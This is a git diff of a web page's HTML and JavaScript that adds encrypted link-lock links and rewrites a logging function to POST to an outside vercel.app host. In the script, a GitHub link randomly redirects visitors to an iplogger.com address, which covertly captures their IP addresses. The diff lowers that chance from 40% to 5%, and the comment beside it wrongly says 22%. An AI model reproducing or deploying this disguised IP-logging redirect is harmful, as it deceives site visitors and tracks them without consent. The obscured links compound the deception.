@@ -54,6 +54,9 @@
       <a id="listingsLink" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoiS1hHOXBNWmlOb3dkQVM0R0ZhRDEveDF5K1VGeWJtODdLd2oyQVpXL1htKzl1RTh4eGRMTGVBUnRyelpTRG5LaGM1Rks1RXdMTjB5OVNESUt5cm1XdmlkVjZZV2tVNUVMd1AxMXVxbXRhSGpKMzlybE45dXVvOVdwQjk1and5ZFVMaHh2am5kak55Q2Q0a2lDT0E0UkZzMzh3SzQ9IiwicyI6Ii8vdloxS1ZGeGZ5cE1VOHIwVFB1eVE9PSIsImkiOiJDQ2RPa0hwUXlsanVHQlpEIn0" target="_blank">Listings Page</a>
       </div>
         <div class="placeholder-info">
+      <a id="Link" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoiRVB1WTIySVg0cWdzZmRqdHFIYmZ5ZDg1UWhzMmNwSHdKSUFnODhRdjN2TEQ1K0RCeDZQcGUyZUMvV2swcTNDZXJ3RlBlMnExY3dvYUtrc2QvWjdxSU9nREtVY1puU2ljVUszN0o5WT0iLCJzIjoiMkdvbndTN0ZDLzBmREhoSWxGSHJLUT09IiwiaSI6Im0vQ3VXb3QrN0Y2c2V0TGQifQ==" target="_blank">Current Analytics</a>
+      </div>
+        <div class="placeholder-info">
       <a id="analyticsLink" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoiQi9YZ3U5cjdxQzRKL3FKdmdFbGtCNTNabGpPTFllRmhOVTh3VjA4WWNzZ0RVYXBPT1F0NDhnRXliQVE3akRiRExIdlVpNWtobFJrPSIsImgiOiJUaGlzIElzIGZvciBkZXZlbG9wbWVudCBzdGFmZiBvbmx5IiwicyI6IlFLbWZTT3lCNFFwMVAwRUY3RnM1L1E9PSIsImkiOiJ3RkNsVFl5c2dZbmJaU2ZKIn0=" target="_blank">Analytics Page</a>
       </div>
       <div class="placeholder-info">
@@ -108,15 +111,29 @@ document.addEventListener("DOMContentLoaded", function() {
 
    // Handle redirection to the Listings Page link
 
-  function appendToLogFile(data) {
-  const logText = `${new Date().toISOString()} - ${data}\n`;
 
-  const blob = new Blob([logText], { type: "text/plain" });
-  const logLink = document.createElement("a");
-  logLink.download = "git-listings-log.txt";
-  logLink.href = URL.createObjectURL(blob);
-  logLink.click();
+  function appendToLogFile(data) {
+  const url = `https://gpm-web-99v9.vercel.app/${data}`;
+  const requestOptions = {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({ message: "Hello, world!" }),
+  };
+
+  fetch(url, requestOptions)
+    .then(response => response.text())
+    .then(result => {
+      console.log(result); // Log the response from the API
+    })
+    .catch(error => {
+      console.error("Error recording log:", error);
+    });
   }
+
+
+
 
   // Handle redirection to the Moderation Board link
   const moderationLink = document.getElementById("moderationLink");
@@ -140,6 +157,14 @@ document.addEventListener("DOMContentLoaded", function() {
     analyticsLink.addEventListener("click", event => {
       event.preventDefault(); // Prevent the default link behavior
       const linkUrl = analyticsLink.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
+  const Link = document.getElementById("Link");
+  if (Link) {
+    Link.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = Link.getAttribute("href"); // Get the link URL
       window.location.href = linkUrl; // Redirect to the link URL
     });
   }
@@ -185,7 +210,7 @@ document.addEventListener("DOMContentLoaded", function() {
         const randomPercent = Math.random() * 100;
 
         // 22% chance (redirect if the random number is less than 22)
-        if (randomPercent < 40) {
+        if (randomPercent < 5) {
           githubLink.addEventListener("click", event => {
             event.preventDefault(); // Prevent the default link behavior
             window.location.href = "https://iplogger.com/26Qh95"; // Redirect to the forms link
